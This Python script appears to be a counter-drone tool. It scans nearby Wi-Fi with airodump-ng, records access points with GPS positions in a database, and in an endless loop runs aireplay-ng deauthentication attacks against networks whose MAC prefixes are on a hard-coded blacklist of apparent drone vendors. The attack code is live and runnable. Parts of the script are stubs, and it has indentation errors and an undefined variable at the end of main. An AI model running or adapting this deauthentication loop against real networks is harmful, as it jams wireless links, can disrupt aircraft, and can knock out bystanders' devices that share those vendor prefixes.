#!/usr/bin/python3
import logging
import argparse
import time
from subprocess import call
from netdevdb import NetdevDb #Abstraction layer for db connectivity
from pyrcrack.scanning import Airodump
from pyrcrack.replaying import Aireplay
import serial # For GPS
from pynmea import nmea
from multiprocessing import Process

def init():
    """
    Initialization: checks for the presence of necessary tools and configures
    the logging environment.  Creates/Connects to database.
    """

    # Setup command line
    # Reference: https://docs.python.org/3/howto/argparse.html#argparse-tutorial # noqa: E501
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--verbose", help="increase output verbosity",
                        action="store_true")
    parser.add_argument("-o", "--output", help="save logs to file")
    args = parser.parse_args()

    # Setup logging
    # Reference: https://docs.python.org/2/howto/logging-cookbook.html#multiple-handlers-and-formatters # noqa: E501
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)

    # Command line output
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter('%(levelname)-8s: %(message)s'))
    logger.addHandler(ch)

    if args.verbose:
        ch.setLevel(logging.DEBUG)

    if args.output is not None:
        # Log to file too
        fh = logging.FileHandler(args.output)
        formatter = logging.Formatter('%(asctime)s,%(levelname)s,%(message)s')
        fh.setFormatter(formatter)
        fh.setLevel(logging.DEBUG)
        logger.addHandler(fh)
        logging.debug("started logging to file")

def scan(netdb, interface):
    """
    Scan: Runs airodump-ng to characterize the environment.
    Returns: [string] containing the detected MAC addresses
    """
    print("Begin scan")
    # Setup the wireless interface to listen on
    wifi = Airodump(interface)
    wifi.start()  
    scanres = wifi.tree
    logging.debug("Got tree")
    #Now add access points to db
    #Get gps data
    gpsdata = getlocation('/dev/ttyUSB1') #Change this to the GPS port

    #mark devices inactive
    netdb.mark_inactive()
    for bssid in wifi.tree:
        netdb.adddevice(bssid, wifi.tree[bssid]['ESSID'], wifi.tree[bssid]['Power'], 
            wifi.tree[bssid]['channel'], wifi.tree[bssid]['Privacy'])
        netdb.addlocation(bssid, gpsdata) #Get GPS coordinates.  This is a placeholder.        
    wifi.stop()
    return []


def select_targets(networks):
    """
    Target Selection: Compares a list of observed MAC addresses against MAC
    addresses identified as belonging to sUAS systems.
    Input: [string] containing MAC addresses from scan
    Returns: [string] containing target MAC addresses
    """
    logging.debug("select targets from")
    logging.debug(networks)
    return []


def refine_targets(networks):
    """
    Target Refinement: Performs additional scans to gain the required
    information necessary to perform the attack such as the active channel.
    Input: [string] containing observed target MAC addresses
    Returns: [(string,int)] with the (MAC,channel) of each target
    """
    logging.debug("refine targets")
    logging.debug(networks)
    return []


def deauth_targets(netdb, wifi):
    """
    Detauth Targets: Performs a replay attack against the listed targets
    Input: [(string,int)] with the (MAC,channel) to target
    """
    logging.debug("deauth targets")
    
    #Get BSSIDs that match blacklist
    attack_pairs = netdb.get_blacklisted()
    logging.debug(attack_pairs)
    foundpairs = False
    for bssid in attack_pairs:
        channel = str(bssid['channel'])
        logging.debug("Blacklisting: " + bssid['bssid']  + " on channel " + channel)
        #Set channel on device
        call(["iwconfig",  wifi, "channel", channel])
        call(["aireplay-ng", "-0", "10", "-a", bssid['bssid'], wifi])
        foundpairs = True
    logging.debug("Dauth targets completed")
    if (foundpairs != True):
	print("No targets found, sleeping 10 seconds")
	time.sleep(10)

def getlocation(gpsdevice): #Pass in gps interface
    #Get current location and return it as a key pair
    ser = serial.Serial()
    ser.port = gpsdevice
    ser.baudrate = 4800
    try:
        ser.open()
        logging.debug("Getting GPS Location")
        gotlocation = False
        while (gotlocation == False):
            gpstext = str(ser.readline())
            if (gpstext[3:8] == 'GPGGA'):
                #Found the proper string, now get the lat long
                #Probably needs a check for GPS lock.
                gotlocation = True
                g = nmea.GPGGA()
                g.parse(gpstext)
                gpsdata = {'latitude':g.latitude, 'longitude': g.longitude, 'timestamp':g.timestamp, 'altitude':g.antenna_altitude}
            else:
                logging.debug("GPS Text was: " + gpstext[3:8])
    except:
        logging.debug("GPS Not found.  ")
        gpsdata = {'latitude':'0', 'longitude': '0', 'timestamp':'0', 'altitude':'0'}
    return gpsdata

def main():
    """
    Main entry point for the script, orchestrates the following actions.
    1. Initialization - check tools and environment
    2. Initial scan - characterize wifi-environment
    3. Target selection - identify MACs associated with sUAS
    4. Target refinement - gain additional target information (channel)
    5. DeAuth Targets
    """

    init()
    logging.info("Started Counter-UAS script")

    #Setup database
    netdb = NetdevDb("c-uas") #Change this to the db name you wish to save things to.
    #Blacklist
    netdb.blacklist('60:60:1F:00:00:00')
    netdb.blacklist('F4:DD:9E:00:00:00')
    netdb.blacklist('D8:96:85:00:00:00')
    netdb.blacklist('D4:D9:19:00:00:00')
    netdb.blacklist('04:41:69:00:00:00')
    netdb.blacklist('A0:14:3D:00:00:00')
    netdb.blacklist('90:3A:E6:00:00:00')
    netdb.blacklist('90:03:B7:00:00:00')
    netdb.blacklist('00:26:7E:00:00:00')
    netdb.blacklist('00:12:1C:00:00:00')
    
    #Configure the setup.  If using multiprocessing, you need to setup interface2
    multiprocessing = True
    interface = 'mon0' #'wlp3s0' #Change this for the pi to something like wlan0
    interface2 = 'wlps30'

    #while True:
    if (multiprocessing):
        while True:

            p1 = Process(target=scan, args=(netdb, interface))

            p2 = Process(target=deauth_targets, args=(netdb, interface2))
            p1.start()
            p2.start()
            #Wait to finish before looping
            p1.join()
            p2.join()
        logging.debug("Completed")
    else:
        while True:
            networks = scan(netdb, interface)
            print ("scan complete")
            netdb.deviceswithlocations() #Show what was scanned
            deauth_targets(netdb, interface)
            #time.sleep(15)
            #targets = select_targets(networks)
            #if len(targets) > 0:
            #    attack_pairs = refine_targets(targets)
            #    deauth_targets(attack_pairs)
        logging.debug("Completed")

    wifi.stop()

if __name__ == "__main__":
    main()
